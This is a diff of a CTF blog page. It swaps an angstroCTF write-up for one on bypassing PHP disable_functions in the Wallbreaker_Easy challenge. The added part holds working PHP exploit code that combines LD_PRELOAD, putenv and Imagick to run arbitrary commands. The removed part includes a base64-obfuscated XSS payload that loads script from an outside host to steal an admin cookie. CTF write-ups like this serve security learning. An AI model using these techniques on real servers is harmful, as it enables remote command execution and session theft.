@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>angstroCTF Web+Misc | 过客</title>	
+<title>Wallbreaker_Easy(Bypass disable_function) | 过客</title>	
 
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 <script type="text/javascript">
@@ -150,10 +150,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">angstroCTF Web+Misc</h1>
+			<h1 class="wow swing entry-title">Wallbreaker_Easy(Bypass disable_function)</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-15 10:51:17" itemprop="datePublished" pubdate="">2020-03-15</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-16 13:47:35" itemprop="datePublished" pubdate="">2020-03-16</time></i>
 	          </div>
 			
 </span>
@@ -161,108 +161,59 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>ws1:<br>
-追踪TCP流得到Flag<br>
-<img src="https://guokeya.github.io/post-images/1584240752587.png" alt="" loading="lazy"><br>
-ws2:<br>
-HTTP流。导出JPG得到Flag<br>
-<img src="https://guokeya.github.io/post-images/1584240943390.png" alt="" loading="lazy"><br>
-inputter:<br>
-源码如下</p>
-<pre><code>#define _GNU_SOURCE
+				<p><img src="https://guokeya.github.io/post-images/1584337687944.png" alt="" loading="lazy"><br>
+给出了webshell。并且/tmp/130a22b5fcf1e7f489bd341fddbb3353可写<br>
+有open_basedir限制目录。<br>
+我们可以在tmp目录下写文件。然后文件包含利用</p>
+<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail
+</code></pre>
+<p>禁用了以上函数。imap_open,mail能调用本地sendmail的函数被禁了。然而putenv没被禁。要么就继续找一个能调用本地sendmail命令的函数。<br>
+方法一：<br>
+调用error_log。将第二个选项配置为1。调用sendmail<br>
+<img src="https://guokeya.github.io/post-images/1584337900293.png" alt="" loading="lazy"><br>
+上传1.so。和1.php<br>
+<img src="https://guokeya.github.io/post-images/1584337957982.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1584338511352.png" alt="" loading="lazy"></p>
+<p>方法二：<br>
+原理都一样。通过phpinfo。发现自带Imagick。不存在旧版本的漏洞<br>
+之前的方法都是通过LD_PRELOAD劫持启动进程。而Imagick也是可以调用外部进程的<br>
+Imagick的底层是ImageMagick。而ImageMagick是通过调用外部程序来进行转换。就好比mail函数。最后会调用本地的sendmail命令。从而启动新的进程。触发LD_PRELOAD<br>
+通过查看/etc/ImageMagick-6/delegates.xml。我们可以知道Image到底调用了啥<br>
+<img src="https://guokeya.github.io/post-images/1584339236782.png" alt="" loading="lazy"><br>
+可以看到。当bmp转jxr或wdp会调用本地的MV命令。</p>
+<pre><code>&lt;?php
+$cmd=$_GET['cmd'];
+file_put_contents(&quot;/tmp/130a22b5fcf1e7f489bd341fddbb3353/1.bmp&quot;,urldecode(&quot;BM%F6%00%00%00%00%00%00%006%00%00%00%28%00%00%00%0A%00%00%00%06%00%00%00%01%00%18%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%00%00%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%00%00%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%00%00%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%00%00%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%00%00%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%00%00&quot;));
+putenv(&quot;EVIL_CMDLINE=&quot;.$cmd.&quot;&gt;/tmp/130a22b5fcf1e7f489bd341fddbb3353/flag.txt&quot;);
+putenv(&quot;LD_PRELOAD=/tmp/130a22b5fcf1e7f489bd341fddbb3353/1.so&quot;);
+echo file_get_contents('/tmp/130a22b5fcf1e7f489bd341fddbb3353/flag.txt');
+$im=new Imagick();
+$im-&gt;readImage(&quot;/tmp/130a22b5fcf1e7f489bd341fddbb3353/1.bmp&quot;);
 
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;unistd.h&gt;
-
-#define FLAGSIZE 128
-
-void print_flag() {
-    gid_t gid = getegid();
-    setresgid(gid, gid, gid);
-    FILE *file = fopen(&quot;flag.txt&quot;, &quot;r&quot;);
-    char flag[FLAGSIZE];
-    if (file == NULL) {
-        printf(&quot;Cannot read flag file.\n&quot;);
-        exit(1);
-    }
-    fgets(flag, FLAGSIZE, file);
-    printf(&quot;%s&quot;, flag);
-}
-
-int main(int argc, char* argv[]) {
-    setvbuf(stdout, NULL, _IONBF, 0);
-    if (argc != 2) {
-        puts(&quot;Your argument count isn't right.&quot;);
-        return 1;
-    }
-    if (strcmp(argv[1], &quot; \n'\&quot;\x07&quot;)) {
-        puts(&quot;Your argument isn't right.&quot;);
-        return 1;
-    }
-    char buf[128];
-    fgets(buf, 128, stdin);
-    if (strcmp(buf, &quot;\x00\x01\x02\x03\n&quot;)) {
-        puts(&quot;Your input isn't right.&quot;);
-        return 1;
-    }
-    puts(&quot;You seem to know what you're doing.&quot;);
-    print_flag();
-}
+$im-&gt;writeImage(&quot;/tmp/130a22b5fcf1e7f489bd341fddbb3353/2.jxr&quot;);
+?&gt;
 </code></pre>
-<p>只要第一个参数为空格换行'&quot;\x07。第二个参数为\x00010203\n<br>
-a.py:</p>
-<pre><code>print &quot; \n'\&quot;\x07&quot;
-</code></pre>
-<p>b.py:</p>
-<pre><code>print &quot;\x00\x01\x02\x03\n&quot;
-</code></pre>
-<pre><code>python b.py|./inpuuter `python a.py`
-</code></pre>
-<p>得到flag</p>
-<p>ws3:<br>
-是一个git-pack的流量。首先wireshark分离出来<br>
-有一个git-receive-pack文件18KB.其他就1KB.<br>
-继续对此文件分离，得到Flag<br>
-<img src="https://guokeya.github.io/post-images/1584241829597.png" alt="" loading="lazy"></p>
-<p>clam clam clam:<br>
-输入两次clam clam clam得到Flag<br>
-不知道为啥。</p>
-<p>The Magic Word:<br>
-右键查看源码<br>
-<img src="https://guokeya.github.io/post-images/1584241879497.png" alt="" loading="lazy"><br>
-magic的值等于please give flag就能拿到flag。HTML改一下就行<br>
-<img src="https://guokeya.github.io/post-images/1584241931632.png" alt="" loading="lazy"></p>
-<p>Xmas Still Stands:<br>
-XSS。直接给烨师傅的payload</p>
-<pre><code>&lt;img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzeWUuY29tL3lleWV5ZT8nK01hdGgucmFuZG9tKCk='))&gt;
-</code></pre>
-<p>得到管理员cookie后。拿到flag</p>
-<p>Consolation:<br>
-<img src="https://guokeya.github.io/post-images/1584242031985.png" alt="" loading="lazy"></p>
-<p>Git Good:<br>
-githacker下来后git log --reflog<br>
-<img src="https://guokeya.github.io/post-images/1584242219800.png" alt="" loading="lazy"></p>
-<p>Secret Agents:<br>
-题目给出了源码<br>
-毫无过滤就带入sql语句。<br>
-<img src="https://guokeya.github.io/post-images/1584242265678.png" alt="" loading="lazy"><br>
-ua头sqlmap跑以下就行</p>
+<p>首先写入一个bmp文件。然后上传1.so。设置要执行的命令。将LD_PRELOAD设置为我们的so。当执行命令时。由于优先级。会优先从我们的so中调用<br>
+然后转换时会成功执行命令。<br>
+由于转换会失败。。所以把回显放到了前面。执行命令时会显示上次的执行结果。重复执行两次就好了<br>
+<img src="https://guokeya.github.io/post-images/1584339677571.png" alt="" loading="lazy"></p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
+				<a href="https://guokeya.github.io/tag/CTF/" rel="tag">CTF</a>	
+				 
+				<a href="https://guokeya.github.io/tag/Web/" rel="tag">Web安全</a>	
+				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/gW7Qnkxsi/" rel="prev"> [网鼎杯2018]Unfinish(二次注入)</a></div>
+		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/pd9adBR7c/" rel="prev"> [DDCTF 2019]homebrew event loop</a></div>
 		 
 		 
-		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/MzHF-GZP0/" rel="next"> [SWPU2019]Web4(堆叠注入+Thinkphp审计)</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/gW7Qnkxsi/" rel="next"> [网鼎杯2018]Unfinish(二次注入)</a></div>
 		
 		</div>
 	</nav>
